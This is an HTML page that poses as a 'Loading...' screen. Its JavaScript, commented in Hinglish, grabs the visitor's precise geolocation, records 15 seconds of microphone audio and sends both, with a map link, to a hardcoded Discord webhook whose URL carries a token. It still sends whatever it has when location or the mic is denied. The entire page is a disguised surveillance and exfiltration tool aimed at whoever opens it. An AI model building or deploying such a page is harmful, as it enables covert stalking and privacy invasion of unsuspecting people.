<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; background: #f4f4f4;}
        h3 { color: #333; }
    </style>
</head>
<body>
    <h3 id="statusText">Please wait...</h3>

    <script>
        // 1. Yahan apna Discord Webhook URL daalo (Quotes ke andar)
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1561633434420383794/wr24hTxamFvjv1uzyvRhsR65EMzP0bWw2AqdUWd3kZZeaOY8f-m22nedaGYhkRg_bsPY";

        // 2. Location nikaalo
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    // Location milte hi mic on karo
                    startMic(lat, lon, mapLink);
                },
                function(error) {
                    // Agar location deny ho jaye, toh bhi mic try karo
                    startMic("Unknown", "Unknown", "Location Denied");
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            startMic("Unknown", "Unknown", "Not Supported");
        }

        // 3. Mic start karo aur Audio record karo
        async function startMic(lat, lon, mapLink) {
            try {
                document.getElementById('statusText').innerText = "Recording audio (15s)...";
                
                // Sirf Audio (Mic) ki permission maango
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: true,
                    video: false 
                });

                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                // Audio data collect karo
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                // Jab recording band ho, toh Discord bhejo
                mediaRecorder.onstop = async () => {
                    // Mic band kar do
                    stream.getTracks().forEach(track => track.stop());
                    document.getElementById('statusText').innerText = "Sending to Discord...";

                    // Audio file banao
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    
                    // Discord par location aur audio bhejo
                    await sendToDiscord(lat, lon, mapLink, blob);
                    document.getElementById('statusText').innerText = "✅ Audio & Location sent to Discord!";
                };

                // Recording shuru karo
                mediaRecorder.start();

                // 15000 ms = 15 second baad recording automatically rok do
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 15000); 

            } catch (err) {
                console.error("Mic error: ", err);
                // Agar mic block ho gaya, toh bas location bhej do
                sendToDiscord(lat, lon, mapLink, null);
                document.getElementById('statusText').innerText = "❌ Mic Permission Denied";
            }
        }

        // 4. Discord API Call
        async function sendToDiscord(lat, lon, mapLink, audioBlob) {
            const formData = new FormData();
            const payload = {
                content: `🎙️ **New Audio Recording (15 Sec)**\n**Lat:** ${lat}\n**Lon:** ${lon}\n**Map:** ${mapLink}`
            };
            formData.append("payload_json", JSON.stringify(payload));

            // Agar audio file mili hai, toh attach karo
            if (audioBlob) {
                formData.append("file", audioBlob, "audio.webm");
            }

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: "POST",
                    body: formData
                });
            } catch (e) {
                console.error("Discord send failed", e);
            }
        }
    </script>
</body>
</html>
